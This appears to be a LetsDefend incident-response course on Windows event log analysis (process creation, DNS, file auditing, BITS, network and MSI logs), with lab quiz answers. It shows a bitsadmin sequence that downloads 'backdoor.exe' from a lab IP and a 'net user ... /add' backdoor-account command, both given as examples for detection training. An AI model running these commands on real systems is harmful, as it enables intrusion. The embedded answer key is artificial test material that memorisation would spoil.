# Advanced Event Log Analysis

The  Advanced Event Log Analysis course provides incident responders with  comprehensive training on leveraging event logs to detect, investigate,  and respond to security incidents effectively. Topics covered include  advanced log analysis techniques, identifying suspicious activity,  correlating events for accurate threat detection, and developing  incident response strategies. Participants will gain practical skills to enhance their ability to protect systems and networks from cyber  threats.

**Table of Contents:**

- [Process Creation](#process-creation)
- [DNS Activity](#dns-activity)
- [File/Folder Monitoring](#filefolder-monitoring)
- [BITS Client Event Log](#bits-client-event-log)
- [Network Connections Event Log](#network-connections-event-log)
- [MSI Event Logs](#msi-event-logs)

**Evaluate Yourself with Quiz**

- [Advanced Event Log Analysis](https://app.letsdefend.io/training/quiz/advanced-event-log-analysis)

## Process Creation

This course is a follow-up to the Event Log Analysis course.

Process creation events  are a type of Windows event that, if enabled, will be recorded in the  local Windows Event Viewer as Event ID 4688 whenever a new process is  started. They include information such as time, process name, parent  process, command line (optional but preferred), and so on.

A process on a Windows  computer is just an application running. On a typical workstation or  server, several processes will be started on a workday. The majority of  these processes are innocent, but the malware will often launch one or  more of them as part of its operation. If an attacker gains remote  access to a system, they can start multiple processes to interact with a computer and achieve their goals. Process creation events allow you to  log such malicious activity and, if logged, it can be identified and  monitored, which is what we are trying to do.

When a program is run, it is often given parameters (also known as arguments) to tell it what to  do. These parameters are important to defenders because they can provide precise information about the nature of the activity. We call them  "command lines" because they provide context for the operation in  progress. For example, if a Powershell-encoded command is executed on an endpoint, the process logs will only show the process name  'Powershell', but if we also have the command line, we can immediately  identify the problem.

### Configure Process Audit Logs

By default, Windows does  not have these event auditing settings enabled, so we need to configure  this and enable it on the system.

First, type edit group policy in the Windows search bar to open Group Policy Settings.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/1.Process+Creation/image1_1.png)

Then go to Computer  Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Detailed Tracking  > Audit Process Creation

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/1.Process+Creation/image1_2.png)

Then click on “Audit Process Creation” and set it to “Success”.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/1.Process+Creation/image1_3.png)

Now we also want to  include 'CommandLine' to be logged with process creation. To do so, in  the same Group Policy Editor, go to Computer Configuration >  Administrative Templates > System > Audit Process Creation >  set “Include Command Line in Process Creation Events” to enabled.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/1.Process+Creation/image1_4.png)

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/1.Process+Creation/image1_5.png)

Click on the setting, tick the check box, and apply.

### Analysis

Now all the process creation logs have "CommandLine". Let's filter the Windows security logs for Event ID 4688.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/1.Process+Creation/image1_6.png)

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/1.Process+Creation/image1_7.png)

Let's take a look at a sample event to cover important fields in this event log.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/1.Process+Creation/image1_8.png)

- **Account Name**  : The user account used to execute the process.
- **New Process Name**  : This field contains the name of the process that was executed and caused this event to be logged.
- **Creator Process Name**  : This is essentially the parent process of the executed process. It is useful for identifying  malicious process relations, e.g. a word.exe process spawning cmd or  PowerShell is suspicious. 
- **Process Command Line**  : This contains the full command and/or arguments.

Now that we have covered  the event log fields and what to look for, let's look at an interesting  log that will give you a clearer perspective.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/1.Process+Creation/image1_9.png)

This example event shows  us the power of the Process Command Line. We can immediately see the  purpose of the process and observe that the process net.exe was spawned  by cmd.exe and the command line is "net user Supp0rt LetsDefendEventLogs /add".

net.exe is a native  binary and is used to manage users/groups on a system. In this example,  it is obvious that the attacker has created a backdoor user account  [MITRE Tactic: T1136], and due to the command line auditing, we now have the adversary-controlled account's password as well for more context.

We can identify many  different security events just by checking Process Logs. They should be  configured in every enterprise environment and stored in a centralized  SIEM solution. 

In this lesson, we have  discussed how to configure event log audit settings, how to understand  log fields, and how to use this data source as an efficient  analyst/hunter to hunt for malicious activity.

### Questions

**Note:** Use the  "C:\Users\LetsDefend\Desktop\QuestionFiles\Security.evtx" file to solve  the questions below. All events related to the incident took place on 23 February 2024.

1 - An incident occurred on 23 February 2024. What network protocol was used to communicate with C2? 

**Note:** Submit the abbreviation of the answer.

> **Answer:** tcp

2 - What is the parent process of the process that leads to the C2 Beaconing?

> **Answer:** C:\Windows\System32\cmd.exe

## DNS Activity

DNS is a critical part of network communications and is sometimes considered the phonebook of the Internet. Before establishing connections via protocols such as  HTTP(S), SMTP, etc., most network software, including malware, relies on DNS to resolve domains to IP addresses. Therefore, DNS logs contain  more comprehensive DNS records, not just HTTP(S) traffic, but also  records of domains accessed by endpoints in the environment, making DNS a highly beneficial log source for defenders.

In addition, DNS is accessible in all enterprise environments, highlighting the reliance of  the network on DNS. Although some of the most restricted network  segments deny HTTP(S) traffic, endpoints can still resolve domains,  providing a direct or indirect connection to the Internet. This utility  makes DNS a tempting protocol for malicious individuals to tunnel  communications for command and control (C2), data infiltration, and data exfiltration - known as DNS tunneling. DNS logging is critical to  identifying this type of malicious activity, further emphasizing its  value as an essential log source for all threat hunters and authorized  personnel.

### Enabling DNS Logging

To log DNS queries, we  can enable 'DNS Client Events' in Event Viewer. Open Event Viewer and go to 'Applications and Services Logs > Microsoft > Windows > DNS Client Events/Operational', right-click, and select 'Enable Log'. In  the example below you can see "Disable log" because the log is already  enabled. If it is disabled, you will see the Enable Log option in the  same spot.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/2.DNS+Activity/image2_1.png)

### Analysis

The first Event ID we are interested in is Event ID 3006. Let’s filter on that:

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/2.DNS+Activity/image2_2.png)

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/2.DNS+Activity/image2_3.png)

Here we can see that a DNS query was made for the domain "letsdefend.io".

The next Event ID we will be analyzing is Event ID 3010. First, filter on this Event ID:

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/2.DNS+Activity/image2_4.png)

Here we can see that this Event ID indicates that the DNS SERVER 172.17.79.2 (internal network  DNS server service) has sent a query to the nameserver "letsdefend.io".  We can use this Event ID to further validate that a query was indeed  sent to the target server.

The last event ID we are interested in is Event ID 3011.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/2.DNS+Activity/image2_5.png)

This result indicates that a response has been received from the 'letsdefend.io' domain server.

We can use these event  IDs to find the suspicious/malicious domain around the time of the  malicious activity. Suppose we find evidence of a C2 stager through  other artifacts, we can look for these event IDs around the time of  other attack indicators to find possible malicious domains.

### Questions

**Note:** Use the "C:\Users\LetsDefend\Desktop\QuestionFiles\DNS Client  Events_Operational.evtx" file to solve the questions below. All events  related to the incident happened on 23 February 2024.

1 - What is the malicious domain that was contacted around 2 minutes after the execution of the beacon?

> **Answer:** thebestgourmetsauce.com

2 - When was the DNS Query called for this domain? Please answer in UTC.  

(Answer Format: YYYY-MM-DD HH:MM:SS)

> **Answer:** 2024-02-23 03:05:53

## File/Folder Monitoring

In any organization that  uses file servers to store and share data, auditing is important to  ensure data security. Proper monitoring of all file servers in your  domain can help you detect unwanted or potentially damaging events,  including file accesses and read events on files containing sensitive  data.

These events can ensure proper defense mechanisms to prevent malicious events such as data exfiltration of sensitive data.

We will first discuss how to configure these audit settings and then learn how to analyze these events.

### Configuring File/Folder Monitoring

To audit these events, go to Computer Configuration > Windows Settings > Security Settings  > Local Policies > Audit Policy > Audit Object Access. Enable  both success and failure events.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/3.FileFolder+Monitoring/image3_1.png)

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/3.FileFolder+Monitoring/image3_2.png)

Now we can go to any folder or file we want to monitor and configure it to be monitored.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/3.FileFolder+Monitoring/image3_3.png)

Go to the folder's “Properties” and select the “Security” tab. Then go to the “Advanced” tab.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/3.FileFolder+Monitoring/image3_4.png)

Now go to the “Auditing” tab and click “Add”.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/3.FileFolder+Monitoring/image3_5.png)

This action opens the  “Audit” screen, here we click on "Select a principal" and here we can  select any specific user or group we want to monitor the activities of.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/3.FileFolder+Monitoring/image3_6.png)

We want to monitor for any activity by anyone so we enter “Everyone” as the object name.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/3.FileFolder+Monitoring/image3_7.png)

When you click OK, you will see the following:

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/3.FileFolder+Monitoring/image3_8.png)

Here, select the “Type” drop-down menu and set it to “All', which will audit all activities, both successes and failures.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/3.FileFolder+Monitoring/image3_9.png)

In the "Applies to"  dropdown we can select the scope of our monitoring, here we want to  monitor the folder, all subfolders in it and all files as well, so we  leave it selected by default.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/3.FileFolder+Monitoring/image3_10.png)

In "Basic permissions", select "Full control". Then click OK.

### Analysis

Now let's monitor this  activity. At the moment we need to focus on Event IDs 4656 and 4663.  There is a file in our Top Secret directory and we will now access it.

We will start by looking at Event ID 4656. This event ID is recorded when the object is requested.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/3.FileFolder+Monitoring/image3_11.png)

The highlighted parts of  the log are the important ones for us. Firstly, we have the user account information, i.e. which user account accessed the target object that  created the event. Secondly, the "Object" part shows the "Object Name"  (what is being accessed and causing the log to be recorded). In this  example, the object is a file called 'Secret.txt' in the 'Top Secret'  folder.

Finally, we have process  information, which shows the process that is accessing the object in  question. In this example, it is "explorer.exe" because we opened the  file location through "explorer.exe".

The other event ID, event ID 4663, is generated when the access to the target object is  successful or failed. In other words, the presence of event ID 4656  alone does not indicate that the access has taken place, but if we see  evidence of 4663 as an audit success, then this means that it has indeed been successful.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/3.FileFolder+Monitoring/image3_12.png)

HerHere we can see the  same information as before, the only difference being that this event  confirms that the access was indeed successful.

We can also confirm that  event ID 4663 means that the object has been accessed or failed by  looking at the keywords. If it says 'audit successful' then it means the object has been accessed, if it says 'audit failed' then it means the  object has been denied access.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/3.FileFolder+Monitoring/image3_13.png)

Looking more closely at  the process accessing the object, we see another example in the  follow-up events where the same file access was requested, but by the  notepad process rather than explorer.exe.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/3.FileFolder+Monitoring/image3_14.png)

This telemetry is useful  in cases where the process accessing the files is suspicious, such as  cmd, PowerShell, and can indicate the use of scripts, etc.

### Questions

**Note:** Use the  "C:\Users\LetsDefend\Desktop\QuestionFiles\Security.evtx" file for  solving the questions below. All events related to the incident happened on 23 February 2024.

1 - What is the name of the directory in the “Documents” folder? This  directory is related to a secret project and implies that some insider  threat accessed it.

> **Answer:** Project_Pegasus_Clearenceonly

2 - At what time this directory was accessed by the user? 

Answer Format: YYYY-MM-DD HH:MM:SS

> **Answer:** 2024-02-23 02:59:59

3 - Which process is responsible for accessing the secret folders? 

Answer Format: C:\FULL\PATH\file.ext

> **Answer:** C:\Windows\explorer.exe

## BITS Client Event Log

Background Intelligent  Transfer Service (BITS) was introduced by Microsoft along with Windows  XP to facilitate and coordinate downloading and uploading of large  files. Applications and system components, including Windows Update,  employ BITS to distribute operating system and application updates in a  way that minimizes user interruption.

Applications interact  with the Background Intelligent Transfer Service by generating jobs  containing multiple files to download or upload. The BITS service runs  in a service host process and can schedule transfers for any time. A  local database stores information about jobs, files, and states.

BITS, like many other  technologies, can be used by legitimate applications as well as  attackers. When malicious applications create BITS jobs, files are  downloaded or uploaded as part of the service host process. This can be  used to bypass firewalls that may block unsafe or unfamiliar processes,  as well as to disguise the application that requested the transfer. BITS transfers can also be scheduled to take place at specific times, rather than being dependent on long-running processes or the task scheduler.

### Using Bitsadmin to Download Files

Let's look at how an attacker can abuse bitsadmin lolbin to download malware/scripts to evade defenses.

```txt
bitsadmin /create letsdefend_eventlogs          
```

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/4.BITS+Client+Event+Log/image4_1.png)

The first command used here is creating a bits job named “letsdefend_eventlogs”.

```txt
bitsadmin /addfile letsdefend_eventlogs http://172.17.79.137/backdoor.exe C:\Users\letsdefend\documents\file.exe           
```

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/4.BITS+Client+Event+Log/image4_2.png)

Next, job parameters are  set. These include the remote URL/URI from which to retrieve a file and  the local path where to save the downloaded file.

```txt
bitsadmin /resume letsdefend_eventlogs               
bitsadmin /complete letsdefend_eventlogs             
```

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/4.BITS+Client+Event+Log/image4_3.png)

This is followed by a  resume flag which downloads the target file. The BITS session remains  open until the /Complete flag is used to complete the BITS job.

### Analysis

Now let's put on our blue hats and analyse the logs generated by this activity.

We are interested in the  Bits-Client Operational logs, which are located under “Applications and  Services Logs > Microsoft > Windows > Bits-Client >  Operational”.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/4.BITS+Client+Event+Log/image4_4.png)

The first Event ID we are interested in is Event ID 3, which is generated when a Bits job is created.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/4.BITS+Client+Event+Log/image4_5.png)

The fields we are  interested in are the transfer job name, the job ID which can be used to track other events related to this particular job, and the job owner,  aka the user account used to create the BITS job.

The next Event ID we need to look for is Event ID 16403. Note that this log is generated when we  give the job its parameters such as remote URI, local path, etc.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/4.BITS+Client+Event+Log/image4_6.png)

Then let's look at this  event in the "Details" tab instead of the "General" tab, as it has  clearer headings. This log gives us great information: job title, job  ID, and job owner, just as in the previous event. The main focus here is the 'RemoteName' and 'LocalName' which records the remote URI and local file path. We can get a lot of IOC from here such as the remote  IP/domain, and filename.

The next Event ID(s) we  are interested in are Event IDs 59 and 60. Event 59 indicates when the  job was launched and Event 60 indicates when it was completed.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/4.BITS+Client+Event+Log/image4_7.png)

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/4.BITS+Client+Event+Log/image4_8.png)

One thing to note about  Event ID 60 is the status code. A 0x0 status code indicates that the  download was successful, so it is vital to check whether the download  was successful or not.

Finally, if the /complete flag has been run to complete the job, an Event ID 4 event will be  generated, indicating that the job has been completed.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/4.BITS+Client+Event+Log/image4_9.png)

The file count tells us how many files were downloaded/uploaded during the whole job.

**Note**  : The whole process is the same for data exfiltration.

### **To Summarize**

- **Event ID 3**: A BITS Job has been created.
- **Event ID 16403**: BITS Job parameters were defined.
- **Event ID 59**: BITS Job was started/resumed.
- **Event ID 60**: BITS Job was stopped. (Status code defines whether successful or not)
- **Event ID 4**: BITS Job was completed.

In this lesson, we have  covered how attackers can use BitsAdmin Lolbin to download/exfiltrate  data and how we, as SOC analysts, can detect this activity using Event  Logs.

### Questions

**Note:** Use the "C:\Users\LetsDefend\Desktop\QuestionFiles\Bits-Client_Operational.evtx" file to solve the questions below. All events related to the incident  took place on 23 February 2024.

1 - What is the name of the BITS Transfer job made to transfer a malicious file?

> **Answer:** remote_clean_service

2 - Where was the downloaded file saved on the local system? Answer with the full path of the file on disk.

> **Answer:** C:\Users\LetsDefend\AppData\Local\Temp\wsman_service.exe

3 - What is the remote URL that was used to download the malicious binary?

> **Answer:** http://172.17.79.137/wsman_service.exe

## Network Connections Event Log

Network connection  analysis can help you monitor network traffic, identify suspicious  connections, track application behavior, and investigate security  incidents. For example, if we have logging capabilities to log network  connection information along with the process that initiated it, we can  easily correlate and perform contextual analysis to pinpoint  suspicious/malicious network activity from those logs alone if an info  stealer has been run on a system. 

### Configuring Audit Event Logs

To enable auditing of  Windows Filtering Platform logs, go to “Local Group Policy Editor >  Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > System Audit Policies >  Object Access > Audit Filtering Platform Connection”.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/5.Network+Connections+Event+Log/image5_1.png)

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/5.Network+Connections+Event+Log/image5_2.png)

This will now log the network connection including the process name.

### Analysis

Let's start analyzing network connections. We will begin with Event ID 5156 in Security Logs.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/5.Network+Connections+Event+Log/image5_3.png)

Here we can see that an outbound connection to 13.235.67.159 on port 4444 has been made by a PowerShell process.

Now by nature PowerShell  making a connection is suspicious in itself but in this case event, the  port is suspicious as port 4444 is widely used by meterpreter.

Let's break down the fields in this event:  

- **Name of the Application**: The process that is making the connection. 
- **Direction**: Outbound/inbound tells us if the connection is internal or external.
- **Source Address and Port**: The local system IP and port.
- **Destination Address and Port**: The Remote IP and Port to which the connection was made.

We can use this valuable  information to identify malicious network connections, such as command  and control activity, infostealer activity, or botnet traffic. We should always look for odd/malicious/benign processes making the connection.  On the other hand, we should also look for the remote IP address in  threat intelligence feeds such as Virustotal to find the reputation of  the IP address. In this example, it's just a VPC, but in reality, it  could be part of an attacker's infrastructure.

### Questions

**Note:** Use the "C:\Users\LetsDefend\Desktop\QuestionFiles\Security.evtx" file to solve  the questions below. All events related to the incident took place on 23 February 2024.

1 - What is the remote C2 IP address that was connected by the process from Lesson 1 Lab?

> **Answer:** 46.23.199.76

2 - Which port was used in C2 communication?

> **Answer:** 4444

3 - The attacker used an MSI on the endpoint. This MSI installed a program  called Cheat Lab, which made multiple network connections. Identify all  these IPs and find the IP address which is the most malicious one and  has less reputation.

> **Answer:** 213.248.43.58

## MSI Event Logs

MSI, previously called  Microsoft Installer, is a Windows installation pack format. It is used  to install and deploy necessary Windows applications or packages to end  users' machines. MSI is a standardized installation method that  streamlines the installation process for users.

Installing MSI files is  simple and usually requires little user intervention. Installing using  MSI is usually similar to running an executable.

It can be difficult to  distinguish between legitimate installers and malicious MSI files.  Threat actors often trick victims into "updating" the software on their  machines by masquerading as well-known software updates.

MSI allows the  LocalSystem account (NT AUTHORITY\SYSTEM) to run, so unauthorized  LocalSystem access can compromise the system and lead to further network compromise. As MSI is based on the COM structure storage, this allows  threat actors to store malicious files in an MSI file and to control the files that are stored with custom actions. This technology gives threat actors multiple execution pattern choices for infecting victim  computers.

### Analysis

We must analyze application logs under Windows logs to find MSI installer activity.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/6.MSI+Event+Logs/image6_1.png)

Go to the log marked with an arrow, and click “Filter Current Log”.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/6.MSI+Event+Logs/image6_2.png)

Then go to Event Sources and find and select the 'MsiInstaller' source.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/6.MSI+Event+Logs/image6_3.png)

Click 'OK' and a list of all events which have to do with MSI activity will now be displayed.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/6.MSI+Event+Logs/image6_4.png)

The first event ID that we are going to check in is Event ID 1040.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/6.MSI+Event+Logs/image6_5.png)

Event ID 1040 records  whenever an installation or uninstallation process for an MSI begins,  including details such as the full path of the MSI and the process ID.

The next key event ID we  will focus on is Event ID 11707. This event ID, together with event ID  1040, tells us whether an installation or uninstallation took place.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/6.MSI+Event+Logs/image6_6.png)

So we need to look for Event ID 1033.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/6.MSI+Event+Logs/image6_7.png)

This event ID indicates  whether the installation was validated and the product was installed  successfully. It also contains the product name, version, and  manufacturer name. This is particularly useful in cases where malware is trying to hide in a fake MSI or legitimate MSIs are being injected with malicious code, for example as part of a supply chain attack.

The status code indicates whether it was successful or not. "A status of '0' means that it was installed without any errors.

If we wish to see if the  installed MSI product has been removed, we can look at Event ID 1034.  Often malware uninstalls itself after it has completed its mission, such as adding a persistence routine, a backdoor, etc.

![img](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Advanced+Event+Log+Analysis/6.MSI+Event+Logs/image6_8.png)

As you can see, the same product has also been uninstalled.  

In this lesson, we have  discussed how to monitor MSI-related activity. Attackers are actively  using MSI as a new vector instead of traditional document delivery with  the rise of new weaponization methods and techniques. Knowing how to  track this activity can help us in a broader incident and create a  timeline of attacker activity.

### Questions

**Note:** Use the  "C:\Users\LetsDefend\Desktop\QuestionFiles\Application.evtx" file to  solve the questions below. All events related to the incident took place on 23 February 2024. 

1 - What is the name of the malicious MSI file?

> **Answer:** Cheat Lab 2.7.2.msi

2 - What is the process ID of the process that installs the malicious MSI?

> **Answer:** 7856

3 - Who is the manufacturer of this MSI?

> **Answer:** Cheat Lab Inc.











































